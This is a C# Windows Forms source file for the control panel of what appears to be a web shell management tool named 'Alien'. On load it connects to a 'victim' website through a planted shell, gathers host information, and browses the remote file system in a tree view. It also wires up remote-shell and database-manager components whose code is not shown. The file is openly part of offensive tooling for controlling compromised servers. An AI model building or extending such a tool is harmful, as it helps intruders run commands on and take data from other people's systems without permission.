using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Alien
{
    public partial class frmControlPanel : Form
    {
        private clsWeb m_web { get; set; }
        private clsVictim m_victim { get { return m_web.m_victim; } }

        private clsInfoSpyder m_infoSpyder { get; set; }
        private clsfnFileMgr m_fileMgr { get; set; }
        private clsfnShell m_rShell { get; set; }
        private clsfnDb m_dbMgr { get; set; }

        public frmControlPanel(clsWeb web)
        {
            InitializeComponent();

            m_web = web;

            m_infoSpyder = new clsInfoSpyder(web);
            m_fileMgr = new clsfnFileMgr(web);
            m_rShell = new clsfnShell(web);
            m_dbMgr = new clsfnDb(web, "db.sqlite");
        }

        async Task<bool> fnbValidator()
        {
            if (!await m_web.fnbTestWebConnection())
            {
                MessageBox.Show("Website connection failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
        {
            List<TreeNode> lNode = new List<TreeNode>();
            foreach (TreeNode node in cNode)
            {
                if (node.Text == szText)
                    lNode.Add(node);
            }

            return lNode.ToArray();
        }

        void fnFileAddPathToTreeView(string szDirPath) => fnFileAddPathToTreeView(szDirPath.Replace("\\", "/").Split('/'));
        void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
        {
            if (asDirPath.Length == 0)
                return;

            string szDir = asDirPath[0];
            TreeNode[] aNode = fnFileFindNodesWithText(node == null ? treeView3.Nodes : node.Nodes, szDir);
            if (aNode.Length == 0)
            {
                TreeNode newNode = new TreeNode(szDir);
                if (node == null)
                    treeView3.Nodes.Add(newNode);
                else
                    node.Nodes.Add(newNode);

                aNode = new TreeNode[] { newNode };
            }

            fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
        }

        TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
        TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
        {
            if (asName.Length == 0)
                return rootNode;

            foreach (TreeNode node in cNode)
            {
                if (string.Equals(node.Text, asName[0]))
                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
            }

            return rootNode;
        }

        async void fnSetup()
        {
            WebBrowser webBrowser = new WebBrowser();
            tabPage1.Controls.Add(webBrowser);
            webBrowser.Dock = DockStyle.Fill;

            if (await fnbValidator())
            {
                if (await m_web.fnbTestShellConnection())
                {
                    var fileInit = await m_fileMgr.fnszInit();

                    //Information
                    webBrowser.DocumentText = await m_infoSpyder.fnszGetInfo();

                    //FileMgr
                    textBox1.Text = fileInit.szCurrentDir;
                    m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
                    foreach (string szName in fileInit.lsLogicalDrive)
                    {
                        TreeNode node = new TreeNode(szName);
                        treeView3.Nodes.Add(node);
                    }

                    fnFileAddPathToTreeView(fileInit.szCurrentDir);
                    treeView3.ExpandAll();

                    TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
                    treeView3.SelectedNode = cdNode;
                }
                else
                {
                    MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            var le = m_fileMgr.fnleScandir(treeView3.SelectedNode.FullPath);
        }
    }
}
